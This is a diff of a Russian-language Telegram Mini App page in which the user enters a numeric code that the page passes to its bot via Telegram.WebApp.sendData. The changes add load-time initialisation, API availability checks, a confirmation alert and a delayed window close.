@@ -14,29 +14,43 @@
     <button id="submitBtn" onclick="sendCode()" style="font-size: 20px; padding: 12px 30px;">Подтвердить</button>
 
     <script>
-        Telegram.WebApp.ready();
-        Telegram.WebApp.expand();
+        // Дождёмся полной загрузки
+        window.addEventListener('load', function() {
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.ready();
+                Telegram.WebApp.expand();
+            } else {
+                alert('Telegram WebApp не поддерживается. Откройте страницу внутри Telegram.');
+            }
+        });
 
-        async function sendCode() {
+        function sendCode() {
             const code = document.getElementById('code').value.trim();
             if (code.length < 4) {
                 alert('Введите код (минимум 4 цифры)');
                 return;
             }
-
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
             btn.textContent = 'Отправка...';
 
+            if (!window.Telegram || !Telegram.WebApp || typeof Telegram.WebApp.sendData !== 'function') {
+                alert('WebApp API недоступен. Попробуйте обновить страницу и нажать кнопку «Ввести код» еще раз.');
+                btn.disabled = false;
+                btn.textContent = 'Подтвердить';
+                return;
+            }
+
             try {
-                // Отправляем данные
                 Telegram.WebApp.sendData(JSON.stringify({ code: code }));
-                // Даём немного времени на отправку, но не закрываем сразу
-                await new Promise(resolve => setTimeout(resolve, 300));
-                // Закрываем окно
-                Telegram.WebApp.close();
+                // Убедимся, что данные ушли (alert появится только если sendData сработал)
+                alert('Код успешно отправлен! Окно закроется автоматически.');
+                // Даём время на отображение alert, потом закрываем
+                setTimeout(function() {
+                    Telegram.WebApp.close();
+                }, 500);
             } catch (e) {
-                alert('Ошибка отправки: ' + e.message + '\n\nПопробуйте обновить страницу и ввести код заново.');
+                alert('Ошибка отправки: ' + e.message + '\nПопробуйте еще раз.');
                 btn.disabled = false;
                 btn.textContent = 'Подтвердить';
             }
